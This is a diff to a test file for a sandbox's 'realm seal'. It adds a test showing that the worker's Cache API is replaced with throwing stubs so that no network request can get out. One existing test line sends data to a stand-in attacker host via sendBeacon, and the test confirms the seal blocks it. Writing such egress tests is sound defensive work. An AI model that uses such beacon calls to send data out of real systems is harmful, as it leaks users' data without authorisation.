@@ -23,6 +23,12 @@ const freshGlobal = () => {
   const proto: any = {
     fetch: nativeFetch,
     importScripts: function importScripts() { return 'NATIVE-IMPORTSCRIPTS'; },
+    // CacheStorage lives on WorkerGlobalScope.prototype too; cache.add()/addAll()
+    // run the Fetch algorithm, so the seal must block it like the rest.
+    caches: {
+      open: () => 'NATIVE-CACHE-OPEN', match: () => undefined,
+      has: () => false, delete: () => false, keys: () => [],
+    },
   };
   const g: any = Object.create(proto);
   g.XMLHttpRequest = function XMLHttpRequest() {};
@@ -81,6 +87,18 @@ describe('realm seal — raw channels are hard-blocked', () => {
     const { g } = freshGlobal();
     applyRealmSeal(g);
     expect(() => g.navigator.sendBeacon('https://evil.example/', 'data')).toThrow('peerd.egress.fetch');
+  });
+
+  test('the Cache API is sealed — its network verbs cannot reach the host', () => {
+    // cache.add()/addAll() run the Fetch algorithm; the offscreen js_run host
+    // that runs this SAME sealed worker allows https:, so the seal (not the page
+    // CSP) must block it. The whole CacheStorage is replaced with throwing stubs.
+    const { g, proto } = freshGlobal();
+    applyRealmSeal(g);
+    expect(() => g.caches.open('x')).toThrow('peerd.egress.fetch');
+    expect(() => g.caches.match('x')).toThrow('peerd.egress.fetch');
+    // the native CacheStorage is gone from the prototype chain, not just shadowed
+    expect(Object.getOwnPropertyDescriptor(proto, 'caches')).toBeUndefined();
   });
 
   test('survives a navigator with no sendBeacon, and no navigator at all', () => {
